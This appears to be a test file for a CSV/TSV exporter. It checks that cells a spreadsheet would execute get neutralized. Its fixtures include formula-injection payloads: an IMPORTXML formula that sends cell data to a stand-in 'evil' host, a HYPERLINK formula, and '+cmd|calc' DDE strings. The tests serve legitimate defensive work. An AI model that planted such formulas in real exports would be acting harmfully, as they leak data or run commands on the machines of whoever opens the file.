import { describe, it, expect } from 'vitest';
import type { ResultSet } from '@asksql/core';
import { toCsv, toTsv } from '../src/format.js';

const resultOf = (columns: string[], rows: unknown[][]): ResultSet =>
  ({ columns: columns.map((name) => ({ name })), rows, rowCount: rows.length }) as unknown as ResultSet;

describe('toCsv', () => {
  it('quotes embedded commas, quotes and nulls (RFC 4180)', () => {
    const csv = toCsv(
      resultOf(
        ['a', 'b'],
        [
          ['plain', 'has,comma'],
          ['he"llo', null],
        ],
      ),
    );
    expect(csv).toBe('a,b\nplain,"has,comma"\n"he""llo",\n');
  });

  it('neutralizes a cell a spreadsheet would execute', () => {
    const csv = toCsv(resultOf(['note'], [['=IMPORTXML("https://evil/?d="&A2,"//x")'], ['@SUM(1)'], ['+cmd|calc']]));
    expect(csv).toContain(`'=IMPORTXML`);
    expect(csv).toContain(`'@SUM(1)`);
    expect(csv).toContain(`'+cmd|calc`);
  });

  it('neutralizes a formula smuggled behind a leading tab or carriage return', () => {
    const csv = toCsv(resultOf(['note'], [['\t=1+1']]));
    expect(csv).toContain(`'\t=1+1`);
  });

  it('neutralizes a column name too - headers land in the same sheet', () => {
    expect(toCsv(resultOf(['=1+1'], [])).split('\n')[0]).toBe(`'=1+1`);
  });

  it('leaves negative and signed numbers as numbers, whether numeric or numeric strings', () => {
    const csv = toCsv(
      resultOf(
        ['amount', 'big'],
        [
          [-1234, '-9007199254740993'],
          [-1.5e-3, '+42'],
        ],
      ),
    );
    expect(csv).toBe('amount,big\n-1234,-9007199254740993\n-0.0015,+42\n');
    expect(csv).not.toContain("'");
  });

  it('still neutralizes a value that only starts like a number', () => {
    expect(toCsv(resultOf(['x'], [['-1+cmd|calc']]))).toContain(`'-1+cmd|calc`);
  });
});

describe('toTsv', () => {
  it('quotes tabs and newlines so the grid does not shift', () => {
    expect(toTsv(resultOf(['a'], [['one\ttwo']]))).toBe('a\n"one\ttwo"');
  });

  it('neutralizes a formula on the clipboard path as well as the file path', () => {
    expect(toTsv(resultOf(['note'], [['=HYPERLINK("https://evil","x")']]))).toContain(`'=HYPERLINK`);
  });

  it('leaves a negative amount pasteable as a number', () => {
    expect(toTsv(resultOf(['amount'], [[-1234]]))).toBe('amount\n-1234');
  });
});
